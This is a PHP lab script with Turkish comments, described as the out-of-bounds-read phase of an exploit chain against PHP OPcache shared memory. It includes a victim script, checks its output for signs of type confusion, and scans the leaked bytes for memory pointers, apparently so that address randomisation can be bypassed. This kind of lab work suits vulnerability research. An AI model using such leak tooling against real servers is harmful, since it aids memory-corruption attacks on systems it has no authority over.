<?php
/**
 * Bug 4 Lab: OOB Read Surface
 *
 * Bu script, victim.php'nin SHM'deki literal'lerini dogrudan okur.
 * Normal durumda: bilinen degerler doner.
 * Type confusion sonrasi: literal'in boyutu/tipi bozulmus olabilir
 * ve PHP, SHM sinirinin otesini okur → bilgi sizdirma (info leak).
 *
 * ?offset=N  ile literal tablosundaki N. literal'i okur.
 * ?raw=1     ile ham binary (base64) doner.
 *
 * Exploit'in Phase 4 (OOB Read) asamasinda kullanilir.
 * SADECE LAB.
 */
header('Content-Type: application/json');

$offset = isset($_GET['offset']) ? (int)$_GET['offset'] : 0;
$raw_mode = !empty($_GET['raw']);

// victim.php'yi include ederek literal'lerini bu process'e al
// OPcache bu script'i SHM'den yukler (persist edilmisse)
$victim_path = '/var/www/html/victim.php';

$result = [
    'pid'        => getmypid(),
    'victim'     => $victim_path,
    'offset'     => $offset,
    'cached'     => false,
    'confused'   => false,
];

// Victim cache'de mi kontrol et
$status = opcache_get_status(true);
if ($status && isset($status['scripts'])) {
    foreach ($status['scripts'] as $path => $info) {
        if (basename($path) === 'victim.php') {
            $result['cached'] = true;
            $result['victim_memory'] = $info['memory_consumption'] ?? 0;
            $result['victim_hits'] = $info['hits'] ?? 0;
            break;
        }
    }
}

if (!$result['cached']) {
    $result['error'] = 'victim.php not in OPcache — run it first to cache';
    echo json_encode($result);
    exit;
}

// victim.php'yi calistir ve ciktisini yakala
ob_start();
include $victim_path;
$output = ob_get_clean();

// Ciktiyi parse et
$lines = explode("\n", $output);
foreach ($lines as $line) {
    if (strpos($line, 'MARKER:') === 0) {
        $result['marker'] = substr($line, 7);
    }
    if (strpos($line, 'PROBE_HEX:') === 0) {
        $hex = substr($line, 10);
        $result['probe_hex'] = $hex;
        $result['probe_len'] = strlen($hex) / 2;

        // Normal: 64 byte (128 hex char) tamami 0x41
        // Confused: farkli uzunluk veya farkli icerik → OOB read delili
        $expected_hex = str_repeat('41', 64);
        if ($hex !== $expected_hex) {
            $result['confused'] = true;
            $result['anomaly'] = 'probe content differs from expected';
            // Farkli byte'lari raporla
            $diffs = [];
            for ($i = 0; $i < min(strlen($hex), strlen($expected_hex)); $i += 2) {
                $got = substr($hex, $i, 2);
                $exp = substr($expected_hex, $i, 2);
                if ($got !== $exp) {
                    $diffs[] = ['offset' => $i/2, 'expected' => $exp, 'got' => $got];
                }
            }
            if (strlen($hex) !== strlen($expected_hex)) {
                $result['length_anomaly'] = [
                    'expected' => strlen($expected_hex) / 2,
                    'got'      => strlen($hex) / 2,
                ];
            }
            $result['byte_diffs'] = array_slice($diffs, 0, 32);

            // Pointer tespiti: 8-byte LE pointer'lar 0x7f.. araliginda mi?
            $raw = hex2bin($hex);
            $pointers = [];
            for ($i = 0; $i < strlen($raw) - 7; $i++) {
                $val = unpack('P', substr($raw, $i, 8))[1];
                if ($val >= 0x0000700000000000 && $val < 0x0000800000000000) {
                    $pointers[] = ['offset' => $i, 'value' => sprintf('0x%x', $val)];
                }
            }
            $result['leaked_pointers'] = array_slice($pointers, 0, 20);
        }
    }
    if (strpos($line, 'PROBE_LEN:') === 0) {
        $result['probe_strlen'] = (int)substr($line, 10);
    }
    if (strpos($line, 'PROBE_TYPE:') === 0) {
        $result['probe_type'] = substr($line, 11);
        if (trim($result['probe_type']) !== 'string') {
            $result['confused'] = true;
            $result['type_anomaly'] = $result['probe_type'];
        }
    }
    if (strpos($line, 'CONFUSION:YES') === 0) {
        $result['confused'] = true;
        $result['confusion_type'] = 'string_read_as_array';
    }
    if (strpos($line, 'EL:') === 0) {
        $result['confused_elements'][] = substr($line, 3);
    }
}

echo json_encode($result, JSON_PRETTY_PRINT);
